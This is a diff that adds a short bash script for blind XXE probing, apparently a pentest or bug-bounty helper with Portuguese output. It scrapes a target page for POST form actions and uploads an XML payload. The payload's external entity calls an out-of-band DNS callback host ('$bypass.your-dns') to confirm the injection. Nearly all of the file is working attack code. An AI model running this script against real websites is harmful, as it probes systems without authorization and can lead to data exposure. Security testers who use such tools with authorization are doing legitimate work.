@@ -1,0 +1,33 @@
+#!/bin/bash
+
+
+interach="your-dns"
+
+bypass=$(echo "$1" |cut -d / -f3)
+
+pay=$(echo -e "<?xml version=\"1.0\" encoding=\"UTF-8\"?>")
+
+pay2=$(echo -e "<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \"http://$bypass.$interach\"> %xxe; ]>")
+
+
+echo -e "$pay" > pay
+echo -e "" >> pay
+echo -e "$pay2" >> pay
+
+
+
+
+entrypoint=$(curl -ks "$1" |egrep "\"POST\"|\"post\"|'post'|'POST'"  |awk -F 'action=' '{print $2}' |cut -d '"' -f2 |cut -d "'" -f2)
+new=$(echo -e "$1$entrypoint")
+
+echo -e "Testando xxe em: $new"
+
+
+timeout 5 curl -ks "$new" -X POST -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0" -H "Content-Type: application/xml;charset=utf-8" -H "X-Requested-With: XMLHttpRequest" --upload-file ./pay 
+
+
+
+rm -f pay
+
+
+
